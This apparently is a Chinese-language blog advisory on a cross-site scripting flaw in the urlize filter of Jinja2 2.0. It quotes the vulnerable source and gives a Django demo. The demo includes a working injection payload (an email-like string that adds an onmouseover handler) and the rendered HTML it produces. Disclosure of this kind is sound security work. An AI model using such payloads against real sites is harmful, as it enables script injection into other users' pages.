---
layout: post
title: Jinja2 2.0 /utils.py urlize vulnerability
---
## 1. Jinja2

> Jinja2(http://jinja.pocoo.org/)是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。 它能完全支持unicode，并具有集成的沙箱执行环境，应用广泛。

## 2. Description

问题出现在Jinja2(https://github.com/mitsuhiko/jinja2/tree/2.0) 2.0版本中，其中对urlize处理不当导致模板层使用处存在跨站脚本漏洞的产生。

## 3. Vulnerability

漏洞文件 /jinja2/utils.py 157-198:

    def urlize(text, trim_url_limit=None, nofollow=False):
        """Converts any URLs in text into clickable links. Works on http://,
        https:// and www. links. Links can have trailing punctuation (periods,
        commas, close-parens) and leading punctuation (opening parens) and
        it'll still do the right thing.

        If trim_url_limit is not None, the URLs in link text will be limited
        to trim_url_limit characters.

        If nofollow is True, the URLs in link text will get a rel="nofollow"
        attribute.
        """
        trim_url = lambda x, limit=trim_url_limit: limit is not None \
                             and (x[:limit] + (len(x) >=limit and '...'
                             or '')) or x
        words = _word_split_re.split(text)
        nofollow_attr = nofollow and ' rel="nofollow"' or ''
        for i, word in enumerate(words):
            match = _punctuation_re.match(word)
            if match:
                lead, middle, trail = match.groups()
                if middle.startswith('www.') or (
                    '@' not in middle and
                    not middle.startswith('http://') and
                    len(middle) > 0 and
                    middle[0] in string.letters + string.digits and (
                        middle.endswith('.org') or
                        middle.endswith('.net') or
                        middle.endswith('.com')
                    )):
                    middle = '<a href="http://%s"%s>%s</a>' % (middle,
                        nofollow_attr, trim_url(middle))
                if middle.startswith('http://') or \
                   middle.startswith('https://'):
                    middle = '<a href="%s"%s>%s</a>' % (middle,
                        nofollow_attr, trim_url(middle))
                if '@' in middle and not middle.startswith('www.') and \
                   not ':' in middle and _simple_email_re.match(middle):
                    middle = '<a href="mailto:%s">%s</a>' % (middle, middle)
                if lead + middle + trail != word:
                    words[i] = lead + middle + trail
        return u''.join(words)

words = _word_split_re.split(text) 对传值text进行简单的正则处理，_word_split_re = re.compile(r'(\s+)')。
随后words进入循环for i, word in enumerate(words)处理后return u''.join(words)。

## 4. demo

    views.py:
    def testtest(request):
        text = request.GET['bb2']
        return render(request, 'test.html', {'text': text})

    temp.html:
        {% raw %}{{ text | urlize }}{% endraw %}

```
GET: http://localhost/?bb2=test@beebeeto.com"/onmouseover=alert(1)//
```

![demo](http://www.hackersoul.com/img/media/jinja2_2_0_urlize_alert.png)

django views.py print:

    Django version 1.6.1, using settings 'fuzzing.settings'
    Starting development server at http://0.0.0.0:8000/
    Quit the server with CONTROL-C.
    [u'<a href="mailto:test@beebeeto.com"/onmouseover=alert(1)//">test@beebeeto.com"/onmouseover=alert(1)//</a>']

## 5. fix

Update